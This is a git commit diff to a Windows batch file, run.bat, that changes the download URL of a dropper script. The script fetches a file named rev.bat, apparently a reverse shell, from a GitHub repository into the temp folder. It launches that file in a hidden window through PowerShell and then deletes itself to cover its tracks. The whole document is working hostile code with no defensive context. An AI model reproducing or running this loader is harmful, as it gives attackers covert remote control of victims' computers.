25bad3cd7f2e668c70ed47a5667551db820cd302
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-06 20:21:06 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,4 +1,4 @@
 @echo off
-curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%temp%\rev.bat"
+curl https://raw.githubusercontent.com/0x2034/shell1/main/rev.bat -o "%temp%\rev.bat"
 powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden"
 del "%~f0"
